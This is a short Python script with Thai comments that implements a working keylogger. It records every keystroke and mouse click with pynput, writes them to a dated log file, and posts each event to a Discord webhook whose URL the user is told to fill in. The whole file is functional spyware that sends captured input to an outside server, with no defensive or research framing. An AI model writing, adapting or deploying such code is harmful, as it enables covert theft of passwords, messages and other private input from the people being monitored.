from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as MouseListener
import logging
import datetime
import requests

# กำหนดไดเรกทอรีที่บันทึกไฟล์
log_dir = ""  # สามารถกำหนดเป็นไดเรกทอรีที่ต้องการ หรือเว้นว่างไว้เพื่อบันทึกในไดเรกทอรีปัจจุบัน

# กำหนดรูปแบบไฟล์ล็อกที่มีชื่อแตกต่างกันในแต่ละวัน
log_filename = f"{log_dir}keylogs_{datetime.datetime.now().date()}.txt"

# กำหนดการตั้งค่าการบันทึกข้อมูล
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# กำหนด Webhook URL ของ Discord
discord_webhook_url = 'YOUR_DISCORD_WEBHOOK_URL'  # แทนที่ 'YOUR_DISCORD_WEBHOOK_URL' ด้วย URL Webhook ของคุณ

# ตัวแปรที่ใช้ควบคุมการส่งข้อมูลไปที่ Discord
send_to_discord_enabled = True  # เปลี่ยนเป็น False เพื่อปิดการส่งข้อความไปที่ Discord

# ฟังก์ชันที่ใช้ส่งข้อความไปที่ Discord
def send_to_discord(message):
    if send_to_discord_enabled:  # เช็คค่าตัวแปรเพื่อเปิดหรือปิดการส่งข้อมูล
        data = {"content": message}  # ข้อความที่จะส่งไปที่ Discord
        response = requests.post(discord_webhook_url, json=data)
        if response.status_code != 204:
            print("Error sending message to Discord:", response.status_code)

# ฟังก์ชันที่ใช้บันทึกการกดปุ่ม
def on_press(key):
    try:
        # ถ้ากดปุ่มตัวอักษร หรือ ตัวเลข
        message = f'กดปุ่ม: {key.char}'
        logging.info(message)
        send_to_discord(message)  # ส่งข้อความไปที่ Discord
    except AttributeError:
        # ถ้ากดปุ่มพิเศษ
        if key == Key.space:
            message = 'กดปุ่ม: Space (ช่องว่าง)'
        elif key == Key.enter:
            message = 'กดปุ่ม: Enter'
        elif key == Key.shift:
            message = 'กดปุ่ม: Shift'
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            message = 'กดปุ่ม: Ctrl'
        elif key == Key.alt_l or key == Key.alt_r:
            message = 'กดปุ่ม: Alt'
        elif key == Key.esc:
            message = 'กดปุ่ม: Esc'
        else:
            message = f'กดปุ่มพิเศษ: {key}'
        
        logging.info(message)
        send_to_discord(message)  # ส่งข้อความไปที่ Discord

# ฟังก์ชันที่ใช้บันทึกการคลิกเมาส์
def on_click(x, y, button, pressed):
    if pressed:
        message = f'คลิกเมาส์ที่ {x}, {y} ด้วยปุ่ม {button}'
        logging.info(message)
        send_to_discord(message)  # ส่งข้อความไปที่ Discord

# เริ่มฟังการกดปุ่มและคลิกเมาส์
with Listener(on_press=on_press) as keyboard_listener, MouseListener(on_click=on_click) as mouse_listener:
    keyboard_listener.join()
    mouse_listener.join()

